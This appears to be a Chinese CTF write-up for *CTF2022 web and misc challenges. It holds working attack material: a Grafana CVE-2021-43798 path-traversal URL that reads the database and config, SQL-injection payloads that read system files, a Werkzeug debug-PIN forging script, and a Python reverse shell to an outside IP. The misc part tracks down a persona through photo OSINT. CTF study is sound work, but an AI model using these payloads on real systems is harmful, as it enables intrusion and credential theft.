# [*CTF2022] WP


## Web

### oh-my-grafana

存在CVE-2021-43798
paylaod

```java
http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
```
有个加盐的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png)
再找找其他配置文件，反正任意文件读取用起来
![在这里插入图片描述](https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

```java
http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini
```
拿到了密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png)

```java
# default admin user, created on startup
admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = 5f989714e132c9b04d4807dafeb10ade
```
进去后可以执行sql语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_14,color_FFFFFF,t_70,g_se,x_16)

查一下表名
![在这里插入图片描述](https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
拿flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
### oh-my-lotto

主要思路就是：

首先是随便摸一个奖，然后在result路由里面获得了结果，是上一轮的

正常情况下，你再次去摸奖，他会wget不改变名字的去下载乐透结果，也就等同于更新一次乐透结果，也就是这个代码

```py
os.system('wget --content-disposition -N lotto')
```

但是在此之前，有这么一句代码

```py
lotto_key = request.form.get('lotto_key') or ''
lotto_value = request.form.get('lotto_value') or ''

os.environ[lotto_key] = lotto_value
```

这里我们可以操作lotto_key和lotto_value

那么就可以把path改掉，让他执行不了wget命令，这样的话，/app/lotto_result.txt就和上一局是一样的

这样的话，我们再把上一次的乐透结果传上去，这样就能判断相等，获取flag

```py
if os.path.exists("/app/guess/forecast.txt"):
    forecast = open("/app/guess/forecast.txt", 'rb').read()

if forecast == lotto_result:
    return flag
```

然后访问lotto路由拿到flag

注意有个坑，乐透结果之间是换行，所以文件构造的也应该是换行
![在这里插入图片描述](https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

### oh-my-note

admin:admin进入后台
在view note处存在sql注入，基本没有过滤，**而且开启了debug**
```java
http://124.70.185.87:5002/view?note_id=pt8q0tub5k59zh9b4hc5te6kdc6vjyn3%27
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
开了debug，需要构造pin码，利用sql注入进行文件读取
payload如下    

```java
';create table fxz1(data text);#
读取mac地址/sys/class/net/eth0/address、/etc/machine-id、/proc/self/cgroup
```

load data 写入创建的表
/etc/machine-id一般固定
1cc402dd0e11d5ae18db04a6de87223d

```java
';LOAD DATA LOCAL INFILE "/sys/class/net/eth0/address" INTO TABLE fxz1;#
';LOAD DATA LOCAL INFILE "/proc/self/cgroup" INTO TABLE fxz2;#
```

查看结果

```java
' union select 1,2,3,4,(select(group_concat(data))from(fxz1))#
```

构造pin生成脚本

```python
#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    'xxx',#  /sys/class/net/eth0/address 16进制转10进制
    'xxxxxx'#  /etc/machine-id+/proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
587-976-623
进去console用python反弹shell，到根目录执行/readflag
```java
import os,pty,socket
s=socket.socket()
s.connect(("101.35.***",8866))
[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png)

## Misc

### today

“I’m anninefour. I love machine learning and data science.
Flag is in my pocket!”
名字是anninefour，喜欢机器学习和数据科学，那么可以去各大机器学习平台社区搜搜这个人
在kaggle里面找到了这个人
https://www.kaggle.com/anninefour
绑定了一个推特
![在这里插入图片描述](https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)
到了一个图片
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)
看到对面有一个农夫果品生鲜超市
去高德搜了一下，全称直接搜没搜到，搜一半农夫果品，发现集中在上海，貌似是上海连锁，而且图片能非常相似的对上
![在这里插入图片描述](https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
在上海区域搜农夫果品生鲜超市，只有一个能完全对应上名字
![在这里插入图片描述](https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)
拍照的小区在对面，叫花山名苑
![在这里插入图片描述](https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16)
在google地图评论里找到了flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)

